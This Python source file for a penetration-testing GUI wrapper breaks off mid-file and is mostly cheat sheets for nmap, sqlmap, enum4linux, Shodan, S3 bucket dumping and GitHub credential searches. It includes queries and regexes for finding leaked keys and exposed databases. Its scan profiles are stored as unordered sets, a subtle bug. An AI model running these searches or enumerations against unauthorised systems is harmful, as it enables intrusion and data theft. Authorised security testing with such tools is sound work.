#!/usr/bin/env python3
"""
The Recon Superpower
A professional GUI wrapper for security reconnaissance tools
For authorized penetration testing, CTF challenges, and security research only

SECURITY MEASURES IMPLEMENTED:
1. Command Injection Prevention:
   - All user inputs validated with whitelist/regex patterns
   - Extra options parsed with shlex.split() to prevent shell injection
   - Shell metacharacters (;, &, |, $, `, etc.) blocked in all inputs
   - NULL byte injection prevention (\x00 detection)
   - subprocess.Popen called with shell=False to prevent shell injection

2. Path Traversal Prevention:
   - File paths normalized and validated before use
   - Path traversal patterns (.., ~) blocked
   - Symlink attacks mitigated with realpath checking
   - File size limits enforced (100MB max for wordlists)
   - Save operations restricted to user's home directory

3. Resource Exhaustion Prevention:
   - Process timeout (1 hour default) to prevent infinite runs
   - Output line limit (10,000 lines) to prevent memory exhaustion
   - Thread count validation (max 1000 for Gobuster)
   - File size validation before loading

4. Thread Safety:
   - Threading locks for process state management
   - Stop event for clean process termination
   - Race condition prevention in scan start/stop operations

5. Input Validation:
   - Target/hostname: alphanumeric, dots, hyphens, slashes, colons only
   - URLs: must be http/https with proper format validation
   - Ports: validated as integers 1-65535
   - Extensions: alphanumeric and commas only
   - Thread counts: validated numeric ranges

6. Process Management:
   - Graceful termination with fallback to force kill
   - Process groups for clean child process cleanup
   - Proper error handling for all subprocess operations
   - Permission error detection and user notification
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import os
from datetime import datetime
import shlex
import re
from urllib.parse import urlparse
import json
import time  # FIX: Added for workflow timing
from pathlib import Path
from collections import deque
import base64
import io

# Try to import PIL for image handling
try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# Try to import cairosvg for SVG conversion
try:
    import cairosvg
    HAS_CAIROSVG = True
except ImportError:
    HAS_CAIROSVG = False


class ReconSuperpower:
    def __init__(self, root):
        self.root = root
        self.root.title("The Recon Superpower")
        self.root.geometry("1400x900")

        # Monokai terminal theme colors
        self.bg_primary = "#272822"      # Main background (dark greenish-gray)
        self.bg_secondary = "#3E3D32"    # Panel background (lighter)
        self.bg_tertiary = "#49483E"     # Sidebar/accent background
        self.accent_green = "#A6E22E"    # Monokai green (strings/success)
        self.accent_cyan = "#66D9EF"     # Monokai cyan (functions/info)
        self.accent_red = "#F92672"      # Monokai pink/red (keywords/errors)
        self.accent_orange = "#FD971F"   # Monokai orange (numbers/warnings)
        self.accent_yellow = "#E6DB74"   # Monokai yellow (classes/highlights)
        self.accent_purple = "#AE81FF"   # Monokai purple (constants)
        self.text_color = "#F8F8F2"      # Monokai foreground (off-white)
        self.text_muted = "#75715E"      # Monokai comments (muted text)
        self.border_color = "#A6E22E"    # Green border

        self.root.configure(bg=self.bg_primary)

        # Process tracking with thread safety
        self.current_process = None
        self.is_running = False
        self.scan_lock = threading.Lock()
        self.stop_event = threading.Event()

        # Security: Process timeout (1 hour default)
        self.process_timeout = 3600

        # Security: Output size limit to prevent memory exhaustion
        self.max_output_lines = 10000
        self.output_line_count = 0

        # Configuration and history
        self.config_dir = Path.home() / ".recon_superpower"
        self.config_file = self.config_dir / "config.json"
        self.history_file = self.config_dir / "history.json"
        self.config_dir.mkdir(exist_ok=True)

        # Recent targets history (max 20 items)
        self.recent_targets = deque(maxlen=20)
        self.recent_urls = deque(maxlen=20)
        self.command_history = deque(maxlen=50)

        # Scan profiles
        self.scan_profiles = {
            "nmap": {
                "Quick Scan": {"-sS", "T4", "1-1000", ""},
                "Deep Scan": {"-sS -sV -sC", "T3", "1-65535", "-A"},
                "Stealth Scan": {"-sS", "T1", "1-1000", "-f"},
                "UDP Scan": {"-sU", "T3", "53,161,500", ""}
            },
            "gobuster": {
                "Quick Dir": {"dir", "10", "php,html,txt", "-k"},
                "Deep Dir": {"dir", "50", "php,html,txt,asp,aspx,jsp,js,json,xml", "-k"},
                "DNS Enum": {"dns", "20", "", ""},
                "VHost Scan": {"vhost", "10", "", "-k"}
            },
            "nikto": {
                "Quick": {"80", False, "x", ""},
                "SSL Scan": {"443", True, "x", ""},
                "Targeted": {"80", False, "4,6,9", ""}
            },
            "sqlmap": {
                "Basic": {"--batch", "--smart", "1"},
                "Full Scan": {"--batch --forms --crawl=3", "--level=5 --risk=3", "5"},
                "Quick Test": {"--batch", "--level=1 --risk=1", "1"},
                "Database Enum": {"--batch --dbs", "--level=3 --risk=2", "3"},
                "Table Dump": {"--batch --tables", "--level=3 --risk=2", "3"}
            },
            "metasploit": {
                "Port Scanner": {"auxiliary/scanner/portscan/tcp", "RHOSTS", "PORTS=1-1000"},
                "SMB Version": {"auxiliary/scanner/smb/smb_version", "RHOSTS", ""},
                "SSH Version": {"auxiliary/scanner/ssh/ssh_version", "RHOSTS", ""},
                "HTTP Version": {"auxiliary/scanner/http/http_version", "RHOSTS", ""},
                "FTP Version": {"auxiliary/scanner/ftp/ftp_version", "RHOSTS", ""},
                "SNMP Enum": {"auxiliary/scanner/snmp/snmp_enum", "RHOSTS", ""}
            }
        }

        # Tool frames storage for sidebar navigation
        self.tool_frames = {}
        self.current_tool = None
        self.tool_container = None

        # Cheat sheets for all tools
        self.tool_cheatsheets = {
            "nmap": """
NMAP CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 BASIC SCANS
────────────────────────────────────────────────────────────
nmap <target>                    # Basic scan (top 1000 ports)
nmap -p- <target>               # All 65535 ports
nmap -p 80,443 <target>         # Specific ports
nmap -p 1-100 <target>          # Port range

🔍 SCAN TYPES
────────────────────────────────────────────────────────────
-sS                             # TCP SYN scan (default, fast, stealthy)
-sT                             # TCP Connect scan (no sudo required)
-sU                             # UDP scan (slow but thorough)
-sV                             # Version detection
-sC                             # Default NSE scripts
-sn                             # Ping scan (no port scan)
-Pn                             # No ping (assume host is up)

⚡ TIMING
────────────────────────────────────────────────────────────
-T0                             # Paranoid (slowest, most stealthy)
-T1                             # Sneaky
-T2                             # Polite
-T3                             # Normal (default)
-T4                             # Aggressive (faster)
-T5                             # Insane (fastest, noisy)

🎯 NSE SCRIPTS (NEW!)
────────────────────────────────────────────────────────────
--script=default                # Run default scripts
--script=vuln                   # Vulnerability detection
--script=discovery              # Network/service discovery
--script=auth                   # Authentication testing
--script=broadcast              # Broadcast scripts
--script=exploit                # Exploit checks
--script=safe                   # Only safe scripts
--script=http-*                 # All HTTP scripts
--script="ssh-* and safe"       # Multiple with AND
--script-args=<args>            # Pass arguments to scripts

🛡️ OS & VERSION DETECTION
────────────────────────────────────────────────────────────
-O                              # OS detection
-sV --version-intensity 9       # Aggressive version scan
-A                              # OS, version, scripts, traceroute

📊 OUTPUT OPTIONS
────────────────────────────────────────────────────────────
-oN file.txt                    # Normal output
-oX file.xml                    # XML output
-oG file.grep                   # Greppable output
-oA basename                    # All formats

💡 COMMON COMBINATIONS
────────────────────────────────────────────────────────────
nmap -sS -sV -T4 -p- <target>           # Full port scan with versions
nmap -sS -sC -sV -O <target>            # Standard comprehensive scan
nmap -Pn -sS -p 80,443 --script=vuln <target>  # Web vuln scan
nmap --script=discovery <target>         # Discovery scan
""",
            "shodan": """
SHODAN CHEAT SHEET
═══════════════════════════════════════════════════════════

🔍 BASIC SEARCHES
────────────────────────────────────────────────────────────
apache                          # Search for Apache servers
nginx                           # Search for Nginx servers
port:22                         # All SSH servers
"default password"              # Devices with default passwords

🎯 FILTERS
────────────────────────────────────────────────────────────
country:US                      # United States only
city:"New York"                 # Specific city
geo:40.7,-74                    # Geographic coordinates
net:192.168.0.0/16             # Network range (CIDR)
hostname:example.com            # Hostname filter
os:Windows                      # Operating system
port:80,443                     # Multiple ports

🏢 PRODUCT/SERVICE FILTERS
────────────────────────────────────────────────────────────
product:MySQL                   # MySQL databases
product:Apache                  # Apache servers
product:nginx                   # Nginx servers
product:IIS                     # Microsoft IIS
ssl:"Organization Name"         # SSL certificate org
http.title:"Dashboard"          # Page title
http.html:"admin"              # HTML content

🌐 IOT & WEBCAMS
────────────────────────────────────────────────────────────
"webcamXP"                      # WebcamXP servers
"Hikvision"                     # Hikvision DVRs
has_screenshot:true             # Devices with screenshots
"port:554 has_screenshot:true"  # RTSP streams with screenshots

⚠️ VULNERABLE DEVICES
────────────────────────────────────────────────────────────
"230 login successful"          # Open FTP servers
"MongoDB Server Information"    # Exposed MongoDB
"product:MySQL"                 # MySQL databases
vuln:CVE-2014-0160             # HeartBleed vulnerable

💡 ADVANCED QUERIES
────────────────────────────────────────────────────────────
apache port:443 country:US      # Multiple filters
nginx -country:CN               # Exclude countries (-)
port:80 http.title:"login"     # Login pages
ssl.cert.expired:true          # Expired certificates

📊 FACETS (STATISTICS)
────────────────────────────────────────────────────────────
--facets country                # Group by country
--facets org                    # Group by organization
--facets port                   # Group by port
--facets product                # Group by product

🔐 SECURITY NOTE
────────────────────────────────────────────────────────────
⚠️ Private IPs (10.x, 172.16-31.x, 192.168.x, 127.x) are
   BLOCKED by this tool for security reasons.
⚠️ Only query public-facing systems you're authorized to test.
""",
            "dnsrecon": """
DNSRECON CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 SCAN TYPES
────────────────────────────────────────────────────────────
-t std                          # Standard enumeration
-t axfr                         # Zone transfer attempt
-t brt                          # Brute force subdomain names
-t srv                          # SRV records enumeration
-t rvl                          # Reverse lookup on range
-t crt                          # crt.sh certificate search
-t zonewalk                     # DNSSEC zone walking

🔍 STANDARD ENUMERATION (-t std)
────────────────────────────────────────────────────────────
dnsrecon -d example.com -t std
- A records (IPv4)
- AAAA records (IPv6)
- MX records (mail servers)
- NS records (nameservers)
- SOA records
- SPF records
- TXT records

🌐 ZONE TRANSFER (-t axfr)
──────────────────────────────────────────────────────────── 
dnsrecon -d example.com -t axfr
- Attempts full zone transfer from nameservers
- Reveals all DNS records if successful
- Often blocked but worth trying

🔨 BRUTE FORCE SUBDOMAINS (-t brt)
────────────────────────────────────────────────────────────
dnsrecon -d example.com -t brt -D wordlist.txt
- Tests subdomain names from wordlist
- Use large wordlists for comprehensive results
- Common wordlists:
  /usr/share/wordlists/dnsmap.txt
  /usr/share/seclists/Discovery/DNS/subdomains-top1million.txt

📊 SRV RECORDS (-t srv)
────────────────────────────────────────────────────────────
dnsrecon -d example.com -t srv
- Enumerates SRV records
- Discovers services like:
  _ldap._tcp
  _kerberos._tcp
  _sip._tcp

🔄 REVERSE LOOKUP (-t rvl)
────────────────────────────────────────────────────────────
dnsrecon -r 192.168.1.0/24 -t rvl
- PTR record lookups on IP range
- Maps IPs back to hostnames
- Useful for network mapping

🔐 CERTIFICATE SEARCH (-t crt)
────────────────────────────────────────────────────────────
dnsrecon -d example.com -t crt
- Queries crt.sh certificate transparency logs
- Discovers subdomains from SSL certificates
- No brute force needed

🚶 DNSSEC ZONE WALK (-t zonewalk)
────────────────────────────────────────────────────────────
dnsrecon -d example.com -t zonewalk
- Enumerate DNSSEC records
- Walk the DNSSEC chain
- Only works if DNSSEC is enabled

⚙️ ADDITIONAL OPTIONS
────────────────────────────────────────────────────────────
-n nameserver                   # Use specific nameserver
-r range                        # IP range for reverse lookup
-D wordlist                     # Wordlist file for brute force
-t type                         # Enumeration type
-x output.xml                   # XML output
-c output.csv                   # CSV output
-j output.json                  # JSON output

💡 TIPS
────────────────────────────────────────────────────────────
• Always try zone transfer first (axfr)
• Use crt.sh search before brute force (faster)
• Combine multiple techniques for best results
• Large wordlists take time (be patient)
• Custom nameserver can bypass some restrictions
""",
            "enum4linux": """
ENUM4LINUX CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 BASIC USAGE
────────────────────────────────────────────────────────────
enum4linux -a <target>          # All enumeration (recommended)
enum4linux <target>              # Basic scan

🎯 ENUMERATION OPTIONS
────────────────────────────────────────────────────────────
-U                              # User listing
-S                              # Share enumeration
-G                              # Group information
-P                              # Password policy
-o                              # OS information
-i                              # Printer information
-r                              # RID cycling
-a                              # All of the above (comprehensive)

👥 USER ENUMERATION (-U)
────────────────────────────────────────────────────────────
enum4linux -U <target>
- Enumerates local users
- Displays user details
- Shows account status
- Useful for password attacks

📁 SHARE ENUMERATION (-S)
────────────────────────────────────────────────────────────
enum4linux -S <target>
- Lists SMB shares
- Shows share permissions
- Identifies writable shares
- Common shares: IPC$, C$, ADMIN$, Users

👔 GROUP INFORMATION (-G)
────────────────────────────────────────────────────────────
enum4linux -G <target>
- Local and domain groups
- Group memberships
- Built-in groups
- Admin group members

🔑 PASSWORD POLICY (-P)
────────────────────────────────────────────────────────────
enum4linux -P <target>
- Minimum password length
- Password complexity requirements
- Account lockout threshold
- Lockout duration
- Password history

🖥️ OS INFORMATION (-o)
────────────────────────────────────────────────────────────
enum4linux -o <target>
- Operating system version
- Windows version
- Domain/workgroup name
- Server type

🔄 RID CYCLING (-r)
────────────────────────────────────────────────────────────
enum4linux -r -U <target>
- Enumerate users via RID cycling
- More comprehensive than standard -U
- Can find hidden accounts

🔐 AUTHENTICATED ENUMERATION
────────────────────────────────────────────────────────────
enum4linux -u username -p password -a <target>
-u                              # Username
-p                              # Password
- Provides more detailed results
- Accesses restricted information
- Required for some enumerations

💡 COMMON COMBINATIONS
────────────────────────────────────────────────────────────
enum4linux -a -u "" -p "" <target>      # Null session
enum4linux -a -u guest -p "" <target>   # Guest account
enum4linux -U -S -G -P <target>         # Core enum
enum4linux -a -M <target>               # All + machine list

📊 OUTPUT TIPS
────────────────────────────────────────────────────────────
• Pipe to file: enum4linux -a <target> > output.txt
• Look for:
  - Writable shares
  - Weak password policies
  - Service accounts
  - Admin group members
  - Guest access enabled

⚠️ COMMON ISSUES
────────────────────────────────────────────────────────────
• "Access Denied" - Try with credentials
• "Connection Refused" - SMB not running or blocked
• Timeouts - Target may be filtering SMB traffic
• Limited results - Use authenticated scan

🎯 TARGET IDENTIFICATION
────────────────────────────────────────────────────────────
• Domain Controllers
• Windows file servers
• Samba servers (Linux/Unix)
• Network attached storage (NAS)
• Printers with SMB
""",
            "githarvester": """
GITHARVESTER CHEAT SHEET
═══════════════════════════════════════════════════════════

🔍 GITHUB SEARCH SYNTAX
────────────────────────────────────────────────────────────
filename:config                 # Files named "config"
extension:pem                   # Files with .pem extension
path:etc                        # Files in etc directory
language:python                 # Python files only
size:>1000                      # Files larger than 1000 bytes

🔑 FINDING CREDENTIALS
────────────────────────────────────────────────────────────
password                        # Generic password search
API_KEY                         # API key references
AWS_ACCESS_KEY                  # AWS credentials
private key                     # Private keys
BEGIN RSA PRIVATE KEY          # RSA private keys
SECRET_KEY_BASE                 # Rails secret keys

🌐 API KEYS & TOKENS
────────────────────────────────────────────────────────────
filename:.env                   # Environment files
filename:config.yml password    # Config files with passwords
extension:json password         # JSON with passwords
GITHUB_TOKEN                    # GitHub personal tokens
slack_token                     # Slack tokens
api_key filename:config        # API keys in config

🗄️ DATABASE CREDENTIALS
────────────────────────────────────────────────────────────
filename:database.yml           # Database configs
mysql_password                  # MySQL passwords
postgres://                     # PostgreSQL connection strings
mongodb://                      # MongoDB connection strings
redis://                        # Redis connection strings

☁️ CLOUD CREDENTIALS
────────────────────────────────────────────────────────────
AWS_SECRET_ACCESS_KEY          # AWS secrets
AZURE_CLIENT_SECRET            # Azure credentials
GCP_SERVICE_ACCOUNT            # Google Cloud
aws_access_key_id              # AWS access keys
client_secret                  # OAuth secrets

📧 EMAIL & PERSONAL INFO
────────────────────────────────────────────────────────────
filename:wp-config.php          # WordPress configs
filename:config.php password    # PHP configs
email filename:users           # User emails
filename:shadow                # Unix shadow files

🔐 CERTIFICATES & KEYS
────────────────────────────────────────────────────────────
BEGIN CERTIFICATE              # SSL certificates
BEGIN PGP                      # PGP keys
extension:pem private          # PEM private keys
extension:key                  # Key files
filename:id_rsa                # SSH private keys

🎯 ORGANIZATIONAL SEARCHES
────────────────────────────────────────────────────────────
org:company-name password       # Search organization
user:username secret           # Specific user
repo:name credentials          # Specific repository

💡ADVANCED SEARCH OPERATORS
────────────────────────────────────────────────────────────
"exact phrase"                  # Exact match
NOT password                    # Exclusion
password OR secret              # OR logic
password AND api_key            # AND logic
password -test                  # Exclude "test"

🧰 REGEX PATTERNS (Use with -r flag)
────────────────────────────────────────────────────────────
[0-9]{4}-[0-9]{4}              # Credit card patterns
([A-Z0-9]{20})                 # AWS Access Keys
([A-Z0-9]{40})                 # AWS Secret Keys
AKIA[0-9A-Z]{16}               # AWS specific format
AIza[0-9A-Za-z\\-_]{35}        # Google API keys

📊 FILTERING & SORTING
────────────────────────────────────────────────────────────
-o best                        # Best matches
-o new                         # Newest first
-o old                         # Oldest first
-a username                    # Filter by account
-p project                     # Filter by project

⚠️ LEGAL & ETHICAL NOTES
────────────────────────────────────────────────────────────
✅ Only search public repositories
✅ Use for security research on your own code
✅ Report findings to repository owners responsibly
❌ Do NOT use found credentials without permission
❌ Do NOT access systems using discovered credentials

🛡️ SECURITY FEATURES IN THIS TOOL
────────────────────────────────────────────────────────────
• Regex patterns validated (max 200 chars)
• Dangerous patterns blocked (ReDoS prevention)
• Query length limited (max 500 chars)
• No nested quantifiers allowed

💡 TIPS FOR EFFECTIVE SEARCHES
────────────────────────────────────────────────────────────
• Start broad, then narrow down
• Use filename and extension filters
• Combine multiple keywords
• Check recently updated repos (sort by new)
• Use regex for specific formats
• Save interesting queries for later
""",
            "feroxbuster": """
FEROXBUSTER CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 BASIC USAGE
────────────────────────────────────────────────────────────
feroxbuster -u https://example.com -w wordlist.txt

🎯 ESSENTIAL OPTIONS
────────────────────────────────────────────────────────────
-u, --url <URL>                 # Target URL
-w, --wordlist <FILE>           # Wordlist file
-t, --threads <NUM>             # Thread count (default: 50)
-d, --depth <NUM>               # Recursion depth (default: 4)
-x, --extensions <EXT>          # File extensions (comma-separated)

📁 WORDLISTS
────────────────────────────────────────────────────────────
Common locations:
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
/usr/share/wordlists/dirb/common.txt

🔍 EXTENSIONS
────────────────────────────────────────────────────────────
-x php,html,txt                 # Web files
-x php,html,js,css             # Web + assets
-x asp,aspx,jsp                # Server-side scripts
-x bak,old,zip,tar             # Backup files
-x pdf,doc,docx                # Documents

⚡ PERFORMANCE TUNING
────────────────────────────────────────────────────────────
-t 100                          # 100 threads (max in tool: 100)
-t 50                           # Default, balanced
-t 10                           # Slower, less aggressive
--rate-limit 100               # Max requests per second
--scan-limit 500               # Max concurrent scans

🎯 RECURSION & DEPTH
────────────────────────────────────────────────────────────
-d 1                            # Only target URL
-d 2                            # Found directories + 1 level
-d 4                            # Default recursion
-d 0                            # Infinite (dangerous!)
--no-recursion                 # Disable completely

🔐 AUTHENTICATION
────────────────────────────────────────────────────────────
-H "Cookie: session=xyz"        # Custom headers
-H "Authorization: Bearer token" # Bearer token
-b "session=xyz"               # Cookie (shorthand)
--user-agent "Custom UA"       # Custom user agent

🛑 FILTERING RESPONSES
────────────────────────────────────────────────────────────
-s 200,301,302                  # Include specific status codes
-C 404,403                      # Hide specific status codes
-S <SIZE>                       # Filter by response size
-W <WORDS>                      # Filter by word count
-L <LINES>                      # Filter by line count

💾 OUTPUT OPTIONS
────────────────────────────────────────────────────────────
-o output.txt                   # Save results
--json                          # JSON output
--debug-log debug.log          # Debug logging
-q, --quiet                     # Suppress banner
-v, --verbosity                 # Increase verbosity

⚙️ ADVANCED OPTIONS
────────────────────────────────────────────────────────────
-k, --insecure                  # Skip SSL verification
-r, --redirects                 # Follow redirects
-a, --user-agent <UA>          # Custom user agent
-p, --proxy http://proxy:port  # Use proxy
--random-agent                  # Random user agents
--dont-filter                   # Show all responses

🎨 SCAN METHODS
────────────────────────────────────────────────────────────
-m GET,POST                     # HTTP methods
--auto-tune                     # Auto-adjust threads
--auto-bail                     # Stop on errors
--collect-backups              # Also search for .bak files
--collect-words                # Collect words from responses

💡 COMMON SCAN PATTERNS
────────────────────────────────────────────────────────────
# Basic directory scan
feroxbuster -u http://example.com -w common.txt

# With extensions
feroxbuster -u http://example.com -w common.txt -x php,html

# Deep scan with extensions
feroxbuster -u http://example.com -w big.txt -x php,html,txt -d 3

# Fast scan (high threads)
feroxbuster -u http://example.com -w common.txt -t 100

# Quiet mode with JSON output
feroxbuster -u http://example.com -w common.txt -q --json -o results.json

# Skip SSL, follow redirects
feroxbuster -u https://example.com -w common.txt -k -r

📊 INTERPRETING RESULTS
────────────────────────────────────────────────────────────
200 OK                          # Accessible resource
301 Moved Permanently           # Redirect (follow it!)
302 Found                       # Temporary redirect
401 Unauthorized                # Auth required
403 Forbidden                   # Exists but forbidden
404 Not Found                   # Doesn't exist
500 Internal Server Error       # Server issue

⚠️ BEST PRACTICES
────────────────────────────────────────────────────────────
• Start with small wordlists (common.txt)
• Monitor server load
• Use appropriate thread counts
• Check robots.txt first
• Respect rate limits
• Save results to file
• Use recursion carefully

🚀 PERFORMANCE TIPS
────────────────────────────────────────────────────────────
• Adjust threads based on target capacity
• Use --auto-tune for optimal performance
• Filter out noise (-C 404)
• Limit depth on large sites (-d 2)
• Use --scan-limit to prevent overload
""",
            "awsbucket": """
AWS BUCKET DUMP CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 BASIC USAGE
────────────────────────────────────────────────────────────
python3 AWSBucketDump.py -l buckets.txt

🎯 MAIN OPTIONS
────────────────────────────────────────────────────────────
-l, --bucket-list <FILE>        # File containing bucket names
-g, --grep <FILE>               # Grep for interesting keywords
-D, --download                  # Download files ( use carefully!)
-t, --threads <NUM>             # Thread count (max 20 in tool)

📁 BUCKET LIST FORMAT
────────────────────────────────────────────────────────────
company-name
company-backup
company-dev
company-prod
example-assets
example-logs

One bucket name per line, no s3:// prefix

🔍 WHAT IT FINDS
────────────────────────────────────────────────────────────
✅ Public buckets
✅ Misconfigured permissions
✅ Directory listings
✅ File metadata
✅ Bucket ACLs
✅ Accessible objects

🔑 GREP KEYWORDS FILE
────────────────────────────────────────────────────────────
Example keywords to search for:
password
secret
key
config
database
backup
credentials
token
api
private

One keyword per line

☁️ COMMON BUCKET NAMING PATTERNS
────────────────────────────────────────────────────────────
{company}
{company}-backup
{company}-backups
{company}-dev
{company}-prod
{company}-staging
{company}-test
{company}-assets
{company}-logs
{company}-data
{company}-files
{company}-public
{domain}
{domain}-backup
www-{domain}

🎯 BUCKET DISCOVERY METHODS
────────────────────────────────────────────────────────────
1. DNS records (dig/dnsrecon)
2. JavaScript files (website source)
3. GitHub searches (buckets in code)
4. SSL certificates (subdomains)
5. Google dorking
6. Wayback Machine
7. Shodan searches
8. Company name permutations

🔒 PERMISSION TYPES
────────────────────────────────────────────────────────────
Public Read                     # List contents
Public Write                    # Upload files (rare, dangerous)
Authenticated Read              # AWS account required
Private                        # Owner only

📊 COMMON FINDINGS
────────────────────────────────────────────────────────────
• Database backups
• Configuration files
• Source code
• AWS credentials
• Customer data
• Application logs
• Backup archives
• Development files

💡 RESPONSIBLE TESTING
────────────────────────────────────────────────────────────
✅ Only test authorized targets
✅ Use -g to filter for specific data
✅ Avoid mass downloading (-D)
✅ Document findings for client
✅ Report to AWS if public exposure

❌ DO NOT
────────────────────────────────────────────────────────────
❌ Download customer/personal data
❌ Modify bucket contents
❌ Share discovered credentials
❌ Access unauthorized buckets
❌ Upload malicious files

⚙️ THREAD RECOMMENDATIONS
────────────────────────────────────────────────────────────
-t 5                            # Default, safe
-t 10                           # Faster, moderate load
-t 20                           # Maximum (tool limit)
-t 1                            # Slow, minimal footprint

📁 OUTPUT INTERPRETATION
────────────────────────────────────────────────────────────
[+] Bucket found: name          # Bucket exists and accessible
[+] Public Read access          # Can list/read files
[!] Public Write access         # Can upload (security issue!)
[*] File: path/to/file         # Discovered file
[-] Access Denied               # Bucket exists but private

🛡️ SECURITY FEATURES IN TOOL
────────────────────────────────────────────────────────────
• Thread limit enforced (max 20)
• Path validation
• Safe directory restrictions
• File size checking

💾 SAVING RESULTS
────────────────────────────────────────────────────────────
python3 AWSBucketDump.py -l buckets.txt > results.txt
python3 AWSBucketDump.py -l buckets.txt -g keywords.txt > filtered.txt

🚨 LEGAL CONSIDERATIONS
────────────────────────────────────────────────────────────
• Accessing data without authorization is ILLEGAL
• Downloading PII/sensitive data is ILLEGAL
• Always get written permission first
• Report findings through proper channels
• Do NOT use discovered credentials

🔍 POST-ENUMERATION
────────────────────────────────────────────────────────────
After finding accessible buckets:
1. Document bucket names and permissions
2. List file types and sizes
3. Note sensitive data patterns
4. Check for versioning enabled
5. Verify bucket policies
6. Report to client/owner
7. Recommend remediation:
   - Remove public access
   - Enable encryption
   - Implement bucket policies
   - Enable logging
   - Use least privilege
""",
            "tcpdump": """
TCPDUMP CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 BASIC USAGE
────────────────────────────────────────────────────────────
sudo tcpdump                    # Capture on default interface
sudo tcpdump -i eth0            # Capture on specific interface
sudo tcpdump -c 100             # Capture 100 packets
sudo tcpdump -w capture.pcap    # Save to file

🌐 INTERFACES
────────────────────────────────────────────────────────────
-i eth0                         # Ethernet interface
-i wlan0                        # Wireless interface
-i any                          # All interfaces
-i lo                           # Loopback

ip link show                    # List available interfaces

🔍 BPF FILTERS (Basic - Tool Allows Simple Filters Only)
────────────────────────────────────────────────────────────
host 192.168.1.1                # Single host
net 192.168.1.0/24              # Network range
port 80                         # Specific port
src 192.168.1.1                 # Source address
dst 192.168.1.1                 # Destination address

🌍 PROTOCOL FILTERS
────────────────────────────────────────────────────────────
tcp                             # TCP traffic only
udp                             # UDP traffic only
icmp                            # ICMP (ping) traffic
arp                             # ARP traffic
ip                              # IP traffic
ip6                             # IPv6 traffic

🔢 PORT FILTERS
────────────────────────────────────────────────────────────
port 80                         # HTTP
port 443                        # HTTPS
port 22                         # SSH
port 21                         # FTP
port 25                         # SMTP
port 53                         # DNS
port 3306                       # MySQL
port 5432                       # PostgreSQL

🎯 COMMON COMBINATIONS (Allowed by Tool)
────────────────────────────────────────────────────────────
tcp and port 80                 # HTTP traffic
tcp and port 443                # HTTPS traffic
udp and port 53                 # DNS queries
host 192.168.1.1 and port 22    # SSH to specific host
icmp                            # All ICMP/ping traffic
tcp and dst port 80             # Outbound HTTP

⚙️ OUTPUT OPTIONS
────────────────────────────────────────────────────────────
-v                              # Verbose output
-vv                             # More verbose
-vvv                            # Maximum verbosity
-n                              # Don't resolve hostnames
-nn                             # Don't resolve hosts or ports
-X                              # Hex and ASCII output
-XX                             # Hex and ASCII with headers

💾 SAVING CAPTURES
────────────────────────────────────────────────────────────
-w file.pcap                    # Save to file
-W 10                           # Rotate after 10 files
-C 100                          # New file every 100 MB
-G 3600                         # New file every hour

📖 READING CAPTURES
────────────────────────────────────────────────────────────
tcpdump -r capture.pcap         # Read from file
tcpdump -r capture.pcap port 80 # Filter while reading
wireshark capture.pcap          # Open in Wireshark

📊 DISPLAY OPTIONS
────────────────────────────────────────────────────────────
-A                              # Print in ASCII
-X                              # Print in hex and ASCII
-q                              # Quick output (less verbose)
-t                              # Don't print timestamps
-tttt                           # Print readable timestamps

🎨 COMMON CAPTURE SCENARIOS
────────────────────────────────────────────────────────────
# HTTP traffic
sudo tcpdump -i eth0 port 80 -w http.pcap

# HTTPS traffic
sudo tcpdump -i eth0 port 443 -vv

# DNS queries
sudo tcpdump -i eth0 udp port 53

# SSH connections
sudo tcpdump -i eth0 port 22

# All traffic to/from host
sudo tcpdump -i eth0 host 192.168.1.100

# ICMP (ping)
sudo tcpdump -i eth0 icmp

# Capture 1000 packets
sudo tcpdump -i eth0 -c 1000 -w capture.pcap

⚠️ SECURITY NOTES (THIS TOOL)
────────────────────────────────────────────────────────────
🔒 Requires sudo/root privileges
🔒 Interface names validated
🔒 BPF filters restricted to simple patterns
🔒 Complex filters blocked for security
🔒 Output files must be in home directory

🛡️ ALLOWED FILTER KEYWORDS
────────────────────────────────────────────────────────────
port, host, net, src, dst, tcp, udp, icmp,
ip, ip6, arp, rarp, and, or, not

No parentheses or complex expressions allowed

💡 ANALYSIS TIPS
────────────────────────────────────────────────────────────
• Capture to file, analyze later
• Use Wireshark for detailed analysis
• Filter before capture (more efficient)
• Use -n to speed up captures
• Limit packet count for quick tests
• Use -s0 to capture full packets

🔍 TROUBLESHOOTING
────────────────────────────────────────────────────────────
Permission Denied
→ Use sudo

Interface not found
→ Check: ip link show

No packets captured
→ Check filter syntax
→ Verify traffic exists
→ Check interface is up

📚 COMMON USE CASES
────────────────────────────────────────────────────────────
• Network troubleshooting
• Security monitoring
• Protocol analysis
• Bandwidth monitoring
• Attack detection
• Application debugging
• Education/learning

🚨 LEGAL & ETHICAL
────────────────────────────────────────────────────────────
✅ Own network only
✅ Authorized testing
✅ Security research
✅ Educational purposes

❌ Unauthorized network sniffing is ILLEGAL
❌ Wiretapping laws apply
❌ Get permission first
""",
            "gobuster": """
GOBUSTER CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 MODES
────────────────────────────────────────────────────────────
dir                             # Directory/file brute-forcing
dns                             # DNS subdomain enumeration
vhost                           # Virtual host brute-forcing
s3                              # S3 bucket enumeration

🗂️ DIRECTORY MODE (dir)
────────────────────────────────────────────────────────────
gobuster dir -u https://example.com -w wordlist.txt

Options:
-u, --url <URL>                 # Target URL
-w, --wordlist <FILE>           # Wordlist
-x, --extensions <EXT>          # File extensions
-t, --threads <NUM>             # Threads (default 10)
-k, --no-tls-validation        # Skip SSL verification
-b, --status-codes <CODES>     # Exclude status codes

🌐 DNS MODE (dns)
────────────────────────────────────────────────────────────
gobuster dns -d example.com -w wordlist.txt

Options:
-d, --domain <DOMAIN>           # Target domain
-w, --wordlist <FILE>           # Subdomain wordlist
-r, --resolver <IP>             # Custom DNS resolver
-t, --threads <NUM>             # Threads
-i, --show-ips                  # Show IP addresses

